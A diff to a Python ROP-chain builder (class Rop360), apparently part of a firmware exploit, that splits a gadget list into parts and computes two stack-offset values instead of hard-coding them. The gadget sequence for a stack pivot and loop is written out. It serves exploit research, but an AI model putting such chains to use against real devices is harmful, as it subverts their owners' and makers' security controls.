@@ -271,7 +271,7 @@ class Rop360(Rop):
         # -- now r0 contains SP, implementing the IF, and we need to pivot to it
         # r12 = r0
 
-        self.rop += [
+        part1 = [
             # r0 = [index]
             G.pop_r0_pc,
             index,
@@ -447,7 +447,10 @@ class Rop360(Rop):
             # set R0 = sp offset if continue to loop, 0 if exiting rop chain
 
             G.pop_r1_pc,
-            692-4, # </data>                                    <!-- R1 --> <!-- = +(number of |data| before RETURN) * 4 -->
+            0xDEAD, # = +(number of |data| before RETURN) * 4 # FILLME
+        ]
+
+        part2 = [
             G.pop_r4_pc,
             G.mul_r0_r1_bx_lr,
             G.blx_r4_pop_r4_pc,
@@ -463,7 +466,9 @@ class Rop360(Rop):
             G.pop_r2_pc,
             G.pop_pc,
             G.mov_r0_sp_blx_r2,
+        ]
 
+        part3 = [
             # r0 += [temp]
             G.pop_r1_pc,
             temp,
@@ -481,7 +486,10 @@ class Rop360(Rop):
 
             # r0 += const
             G.pop_r1_pc,
-            96, # </data>                                    <!-- R1 --> <!-- = (number of |data| after mov_r0_sp-blx_r2 and before RETURN_ADDRESS) * 4 -->
+            0xDEAD, # = (number of |data| after mov_r0_sp-blx_r2 and before RETURN_ADDRESS) * 4 # FILLME
+        ]
+
+        part4 = [
             G.pop_r4_pc,
             G.adds_r0_r1,
             G.blx_r4_pop_r4_pc,
@@ -497,3 +505,9 @@ class Rop360(Rop):
 
             # only get here when the loop is complete
         ]
+
+        # fill the FILLMEs
+        part1[-1] = len(part1 + part2 + part3 + part4) * 4
+        part3[-1] = len(part3 + part4) * 4
+
+        self.rop += part1 + part2 + part3 + part4
